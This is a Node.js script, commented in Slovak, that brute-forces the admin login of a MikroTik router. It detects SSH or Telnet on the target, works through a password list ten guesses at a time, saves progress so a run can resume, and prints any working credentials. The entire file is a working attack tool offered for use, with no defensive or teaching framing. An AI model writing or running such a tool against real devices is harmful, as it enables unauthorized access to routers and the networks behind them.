const net = require('net');
const { Client } = require('ssh2');
const fs = require('fs').promises;
const readline = require('readline');

// Konfigurácia
const TARGET_IP = '192.168.88.1'; // IP cieľového MikroTiku
const USERNAME = 'admin'; // Predvolené meno
const PASSWORD_FILE = 'passwords.txt'; // Súbor s heslami
const PROGRESS_FILE = 'progress.json'; // Súbor na ukladanie progresu
const MAX_CONCURRENT = 10; // Zvýšené pre rýchlosť (pôvodne 5)
const DETECTION_TIMEOUT = 100; // Rýchlejší timeout pre detekciu (ms)

// Potenciálne služby MikroTiku a ich predvolené porty
const SERVICES = {
    ssh: { port: 22, name: 'SSH' },
    telnet: { port: 23, name: 'Telnet' },
};

// Globálne premenné
let passwords = new Set();
let totalPasswords = 0;
let foundCredentials = null;
let activeService = null;

// Detekcia aktívnych služieb s prioritou SSH
async function detectServices() {
    console.log('Skenujem aktívne služby na', TARGET_IP);

    const promises = Object.entries(SERVICES).map(([key, { port, name }]) =>
        new Promise((resolve) => {
            const socket = new net.Socket();
            socket.setTimeout(DETECTION_TIMEOUT);

            socket.on('connect', () => {
                socket.destroy();
                resolve({ key, port, name });
            }).on('timeout', () => {
                socket.destroy();
                resolve(null);
            }).on('error', () => {
                socket.destroy();
                resolve(null);
            }).connect(port, TARGET_IP);
        })
    );

    const results = await Promise.all(promises);
    const availableServices = results.filter(result => result !== null);

    if (availableServices.length === 0) {
        throw new Error('Žiadne aktívne služby neboli nájdené.');
    }

    const sshService = availableServices.find(service => service.key === 'ssh');
    activeService = sshService ? { ...sshService, triedPasswords: new Set(), currentIndex: 0 } : { ...availableServices[0], triedPasswords: new Set(), currentIndex: 0 };
    console.log(`Vybraný protokol: ${activeService.name}`);
}

// Načítanie hesiel zo súboru
async function loadPasswords() {
    try {
        const fileStream = require('fs').createReadStream(PASSWORD_FILE);
        const rl = readline.createInterface({ input: fileStream });

        for await (const line of rl) {
            const trimmed = line.trim();
            if (trimmed) passwords.add(trimmed); // Rýchlejšie pridanie bez duplicity kontroly (Set to zvládne)
        }
        totalPasswords = passwords.size;
        if (totalPasswords === 0) throw new Error('Súbor s heslami je prázdny.');
        console.log(`Načítaných ${totalPasswords} hesiel.`);
    } catch (err) {
        throw new Error(`Chyba pri načítaní hesiel: ${err.message}.`);
    }
}

// Načítanie progresu
async function loadProgress() {
    try {
        const data = await fs.readFile(PROGRESS_FILE, 'utf8');
        const allProgress = JSON.parse(data)[TARGET_IP] || {};
        const progress = allProgress[activeService.key];
        if (progress) {
            activeService.currentIndex = progress.lastIndex || 0;
            activeService.triedPasswords = new Set(progress.triedPasswords || []);
        }
        if (allProgress.foundCredentials) {
            foundCredentials = allProgress.foundCredentials;
            console.log('Správne heslo nájdené v minulosti:', foundCredentials);
        }
        console.log(`Progres: ${activeService.currentIndex}/${totalPasswords}`);
    } catch (err) {
        console.log(`Žiadny predchádzajúci progres pre ${TARGET_IP}/${activeService.name}.`);
    }
}

// Uloženie progresu
async function saveProgress() {
    const progress = {
        [TARGET_IP]: {
            [activeService.key]: {
                lastIndex: activeService.currentIndex,
                triedPasswords: Array.from(activeService.triedPasswords),
            },
            ...(foundCredentials ? { foundCredentials: { ...foundCredentials, ip: TARGET_IP } } : {})
        }
    };
    await fs.writeFile(PROGRESS_FILE, JSON.stringify(progress, null, 2));
    console.log(`Uložený progres: ${activeService.currentIndex}/${totalPasswords} (${((activeService.currentIndex / totalPasswords) * 100).toFixed(2)}%)`);
}

// Funkcie pre pokusy o prihlásenie
function trySSH(password) {
    return new Promise((resolve) => {
        const conn = new Client();
        conn.on('ready', () => {
            foundCredentials = { protocol: 'SSH', username: USERNAME, password };
            conn.end();
            resolve(true);
        }).on('error', () => {
            conn.end();
            resolve(false);
        }).connect({
            host: TARGET_IP,
            port: activeService.port,
            username: USERNAME,
            password,
            readyTimeout: 3000, // Znížený timeout pre rýchlosť
            keepaliveInterval: 0,
        });
    });
}

function tryTelnet(password) {
    return new Promise((resolve) => {
        const socket = new net.Socket();
        socket.setTimeout(100);
        socket.on('connect', () => {
            socket.write(`${USERNAME}\r\n${password}\r\n`);
        }).on('data', (data) => {
            if (data.toString().includes('>')) {
                foundCredentials = { protocol: 'Telnet', username: USERNAME, password };
                socket.destroy();
                resolve(true);
            } else {
                socket.destroy();
                resolve(false);
            }
        }).on('timeout', () => {
            socket.destroy();
            resolve(false);
        }).on('error', () => {
            socket.destroy();
            resolve(false);
        }).connect(activeService.port, TARGET_IP);
    });
}

// Brute-force pre vybraný protokol
async function bruteForce() {
    await loadPasswords();
    await loadProgress();

    if (foundCredentials) {
        console.log('Úspešné prihlásenie z predchádzajúceho progresu!');
        console.log(`IP: ${TARGET_IP} | Protokol: ${foundCredentials.protocol} | Meno: ${foundCredentials.username} | Heslo: ${foundCredentials.password}`);
        process.exit(0);
    }

    const passwordArray = Array.from(passwords);
    const tryFunc = activeService.key === 'ssh' ? trySSH : tryTelnet;
    let saveCounter = 0; // Počítadlo na obmedzenie ukladania

    while (activeService.currentIndex < totalPasswords && !foundCredentials) {
        const batchSize = Math.min(MAX_CONCURRENT, totalPasswords - activeService.currentIndex);
        const promises = [];

        for (let i = 0; i < batchSize; i++) {
            const idx = activeService.currentIndex + i;
            if (idx >= totalPasswords) break;

            const password = passwordArray[idx];
            if (activeService.triedPasswords.has(password)) continue;

            activeService.triedPasswords.add(password);
            promises.push(tryFunc(password).then((success) => ({ password, success })));
        }

        const results = await Promise.all(promises);
        activeService.currentIndex += batchSize;

        for (const { success } of results) {
            if (success) break; // Ak je nájdené, prerušíme cyklus
        }

        console.log(`Progres: ${activeService.currentIndex}/${totalPasswords} (${((activeService.currentIndex / totalPasswords) * 100).toFixed(2)}%)`);

        // Ukladanie každých 5 dávok pre rýchlosť, ale stále priebežne
        if (++saveCounter % 5 === 0 || foundCredentials) {
            await saveProgress();
        }

        await new Promise((r) => setTimeout(r, 10)); // Minimálna pauza pre stabilitu
    }

    if (foundCredentials) {
        console.log('Úspešné prihlásenie!');
        console.log(`IP: ${TARGET_IP} | Protokol: ${foundCredentials.protocol} | Meno: ${foundCredentials.username} | Heslo: ${foundCredentials.password}`);
        await saveProgress();
        process.exit(0);
    } else {
        console.log(`Nenašlo sa heslo pre ${TARGET_IP}.`);
        await saveProgress();
    }
}

// Zachytenie Ctrl+C
process.on('SIGINT', async () => {
    console.log('\nUkončené Ctrl+C');
    console.log(`Progres: ${activeService.currentIndex}/${totalPasswords} (${((activeService.currentIndex / totalPasswords) * 100).toFixed(2)}%)`);
    console.log(`Protokol: ${activeService.name} | Úspešné: ${foundCredentials ? 'Áno' : 'Nie'}${foundCredentials ? ` | Heslo: ${foundCredentials.password}` : ''}`);
    console.log(`Neúspešné pokusy: ${activeService.currentIndex - (foundCredentials ? 1 : 0)}`);
    await saveProgress();
    process.exit(0);
});

// Spustenie
async function runWithRetry() {
    try {
        await detectServices();
        await bruteForce();
    } catch (err) {
        console.error(`Chyba: ${err.message}.`);
        if (activeService) await saveProgress();
        process.exit(1);
    }
}

runWithRetry();